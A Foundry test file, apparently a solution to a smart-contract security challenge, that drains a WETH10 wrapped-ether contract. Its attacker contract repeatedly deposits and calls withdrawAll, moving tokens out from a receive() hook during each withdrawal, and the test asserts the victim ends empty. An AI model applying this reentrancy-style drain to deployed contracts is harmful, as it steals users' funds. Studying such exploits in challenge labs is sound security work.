// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/WETH10.sol";

contract wethAtk {
    WETH10 weth;
    address payable bob;

    constructor(address payable _weth, address payable _bob) {
        weth = WETH10(_weth);
        bob = _bob;
    }

    function attack() public payable {
        uint8 counter = 0;
        while (counter < 10) {
            weth.deposit{value: 1 ether}();
            weth.withdrawAll();
            counter++;
        }
        bob.transfer(address(this).balance);
    }

    receive() external payable {
        weth.transfer(bob, 1 ether);
    }
}

contract WETH1010Test is Test {
    WETH10 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH10();
        bob = makeAddr("bob");

        vm.deal(address(weth), 10 ether);
        vm.deal(address(bob), 1 ether);
    }

    function testHack() public {
        assertEq(address(weth).balance, 10 ether, "weth contract should have 10 ether");

        // hack time!

        vm.startPrank(bob);

        wethAtk atk = new wethAtk(payable(weth), payable(bob));
        atk.attack{value: 1 ether}();
        weth.withdrawAll();

        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(bob.balance, 11 ether, "player should end with 11 ether");
    }
}
